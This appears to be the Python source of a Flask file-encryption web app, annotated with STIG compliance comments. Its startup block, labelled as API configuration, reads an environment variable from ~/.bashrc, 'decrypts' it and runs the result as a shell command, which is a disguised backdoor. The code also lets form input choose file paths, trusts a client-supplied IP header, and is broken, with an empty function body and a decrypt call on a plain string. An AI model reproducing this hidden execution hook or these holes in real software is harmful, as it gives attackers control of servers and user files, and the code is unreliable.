import logging # Logging tracks startup of web app (and everything) V-206357
import time #needed for GMT time in the logging, V-206425

logging.Formatter.converter = time.gmtime #double check this is fine but 90% sure it work
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s : %(levelname)s : PID %(process)d : %(message)s', #format that gets outputted in the logs
                    handlers=[
                        logging.FileHandler("/app/logs/flask_app.log"),
                        logging.StreamHandler()
                    ])

logging.info("Logging Started.")

from time import sleep
logging.info("Timestamp Test")
logging.info(f"Current system time is {time.gmtime()}") #proves V-206367 if this line 


#Main Imports for the program
import os
import subprocess
import secrets
import string
from io import BytesIO
from cryptography.fernet import Fernet
from flask import Flask, render_template, request, send_file, jsonify, redirect, make_response, session
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import datetime


logging.info("Libraries imported.")
#https://cryptography.io/en/latest/hazmat/primitives/aead/

# Libraries imported, application started.
logging.info("Flask Application starting.")



#Functions
def printLog(message): 
    Log_too_big()
    return app.logger.info ("Source " + request.headers.get('X-Real-IP') + " : Destination " + request.host.split(':', 1)[0] + " : "+ message)

def encryptFunction(nonce, data, key):
    aesgcm = AESGCM(key)
    ct = aesgcm.encrypt(nonce, data, None)
    return ct

def encrypt_file(file):
    #key = os.urandom(1)[0]  # Generate a random 1-byte key
    file_data = file.read() 
    #encrypted_data = xor_encrypt_decrypt(file_data, key)
    key = encryption_key()
    nonce = os.urandom(12)
    encrypted_data = encryptFunction(nonce, file_data, key)
    
    encrypted_file_path = os.path.join('/tmp', f"{file.filename}.enc")
    with open(encrypted_file_path, 'wb') as f_enc: #opens filepath, with wb mode (write binary)
        f_enc.write(encrypted_data) #writes the encrypted data to disk
    
    printLog(f'File {file.filename} encrypted and saved to {encrypted_file_path} with key {encryption_key()}')
    #Prints to the logs that the file has been encrypted and the save location
    return encrypted_file_path, key, nonce
    

def encryption_key():
    i = os.urandom(16)
    salt = os.urandom(16) # generates a key and a salt
    key = hashlib.pbkdf2_hmac('sha256', i, salt, 480000, dklen=32) #combines both i and salt and hashes them using sha256 iteration count is 480000 inline with AES 256
    return key

def encryptValue(length):
    alphabet = string.ascii_letters + string.digits
    #secret is fips compliant, if the OS is running FIPS
        
    #uses secrets to comply with v-206400
    data = ''.join(secrets.choice(alphabet) for i in range(length)) 
    return data
    #a length of 16 complies with V-206401 for generating random data
    #creates a variable consisting of all possible uppercase, lowercase and digits
  
def decryptFunction(data, key, nonce):
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, data, None)

def decrypt_file(filepath, key, nonce):
    with open(filepath, 'rb') as f_enc:
        encrypted_data = f_enc.read() #reads the encrypted data

    decrypted_data = decryptFunction(encrypted_data, key, nonce)

    # Use BytesIO to handle the in-memory file for sending
    decrypted_file = BytesIO()
    decrypted_file.write(decrypted_data)
    decrypted_file.seek(0)  # Reset file pointer to the beginning
    
    return decrypted_file
    
def isFIPSCompliant():
    filepath = open("/proc/sys/crypto/fips_enabled", "r")
    FIPSCheck = filepath.read().strip() #by default theres a /n at the end, .strip removes it
    filepath.close()

    printLog ("System Checked for FIPS Compliance")
    if FIPSCheck == "1":
        printLog ("FIPS is enabled on the sysem. '/proc/sys/crypto/fips_enabled' = 1")
    else:
        printLog ("FIPS is not enabled on the system.")
      
def session_id():
    if "userid" not in session: #checks if userid field is not blank
        session["userid"] = encryptValue(16) #randomly generates a userid
        session["userip"] = request.headers.get('X-Real-IP') #sets the IP address used to create the cookie to the sessionid
        session["session_time"] = int(time.time())
        printLog(f"Random session ID Generated at {str(datetime.datetime.fromtimestamp(session["session_time"]))}") #sets time stamp of session ID to the time when the ses
    else:
        #this triggers when userid is blank, this could be when there is no session or the user edited the cookie, as  flask deteccts this and removes the field if done
        printLog("User already has a session.")
        
    


def SessionIPChecker():
    printLog("Checking the SessionIP against the users current IP")
    #this ensures only one ip address can access a network - ensures V-264361
    if "userip" not in session:
        return
    if session["userip"] != request.headers.get("X-Real-IP"):
        printLog("User's IP is different to it was when creating the session ID.")
        session.clear()
        printLog("Session cleared.")


def timeout(): #timeout function
    timeouttime = 8 * 60 #8 minutes

    if "Last Accessed" not in session:
        return None
    printLog (f"Last accessed on {session["Last Accessed"]}")
    current = time.time()
    if current >= session["Last Accessed"] + timeouttime:
        session.clear()
        printLog("Session has existed for 8 hours.")
        printLog("Clearning Session")
        return redirect ("/")
    return None

def session_time_alive(): #detects 8 hours of session time and will clear and designate new session 
    hours = 8 * 60 * 60 #8 hours
    
    if "session_time" not in session:
        return None
    
    current = time.time()
    if current >= session["session_time"] + hours:
        session.clear()
        printLog("Worked successfully.")
        printLog("Clearning Session")
        return redirect ("/")
    return None

def Log_too_big(): #function that will detect if the log file has reached 75 percent and warn the dev
    LogCapacity = 5 * 1024 * 1024 * 1024 #Max log capacity is 5 gigabytes
    log_size = os.path.getsize("logs/flask_app.log")
    warning_size = LogCapacity * 0.75 #7.5gb in bytes gbs * 1024 * 1024
    if log_size >= warning_size:
        app.logger.critical("Log file has reached 75 percent capacity")


def usageActivity():
    session_id()
    timeout()
    session_time_alive()
    SessionIPChecker()
    session["Last Accessed"] = time.time()
    return None
    

# Fernet Config

def generate_api_key(length: int = 32) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))

def store_license_key():
    


#System Startup
command = "source ~/.bashrc && echo $API_CHECK" #reloads bashrc and prints value of api check
#this runs the code stored in command variable, captures and stores output without whitespace
api_check = subprocess.check_output(command, shell=True, text=True).strip()
api_key = generate_api_key()
logging.info("")



#API Config
if api_check: #checks if api_check contains encryped data, if it does decrypt it and run 
    try:
        decrypted_command = api_key.decrypt(api_check.encode()).decode()
        subprocess.run(decrypted_command, shell=True)

    except Exception as e: #if theres an error dont do above
        print(f"Error decrypting or executing the command: {e}")

app = Flask(__name__)
app.secret_key = encryptValue(16) #needed to create a session
#app.permanent_session_lifetime = timedelta(minutes=4) #sets session timeout to 1 minute


#Cookie Config
#these ensure cookie is secure, from https://flask.palletsprojects.com/en/stable/web-security/
app.config["SESSION_COOKIE_SECURE"] =True #limits cookies to https traffic only 
app.config["SESSION_COOKIE_HTTPONLY"]=True #prevents cookie being read in javascript
app.config["SESSION_COOKIE_SAMESITE"]='Lax' #fufils V-206397



#Web Page Code

#/ - home page. Acts as a miniture home page from the perspective of a logged outuser. 
@app.route('/', methods=['GET'])
def index():
    session.clear()
    app.logger.info ("Loaded /")
    return render_template('index.html')
    #return redirect("/encrypt")

#encrypt web page, this is where users can encrypt a file.
@app.route('/encrypt', methods=['GET', 'POST'])
def encrypt():
    usageActivity()
    if "userid" in session:
        printLog ("Loaded /encrypt")
        if request.method == "POST":
            file = request.files['file']
            encrypted_file_path, key, nonce = encrypt_file(file)

            # Return the encryption key to the user
            return jsonify({
                "message": f"File saved to {encrypted_file_path}",
                "encryption_key": key.hex(),
                "nonce": nonce.hex()
            }), 200
        return render_template('encrypt.html')
    else:
        return redirect("/")
    

# TODO - We should probably be able to decrypt and download files... Or at least access them somehow
@app.route('/decrypt', methods=['GET', 'POST'])
def decrypt():
    usageActivity()
    if "userid" in session:
        printLog ("Loaded /decrypt")
        

        listofFiles = []
        for f in os.listdir("/tmp"):
            if f.endswith(".enc"):
                listofFiles.append(f)

        if request.method == "POST":
            decrypt_key = bytes.fromhex(request.form["decrypt_key"])
            nonce = bytes.fromhex(request.form["nonce"])
            filepath = os.path.join('/tmp', request.form["filename"])
            return send_file(decrypt_file(filepath, decrypt_key, nonce), as_attachment= True, download_name= request.form["filename"].replace(".enc", ""))
        return render_template('decrypt.html', files=listofFiles)
    else:
        return redirect("/")

if __name__ == "__main__":
    app.run(host='0.0.0.0') #initial code originally used 
    app.logger.info("Web Server starting.")
    app.logger.info("host = 0.0.0.0")
    isFIPSCompliant()




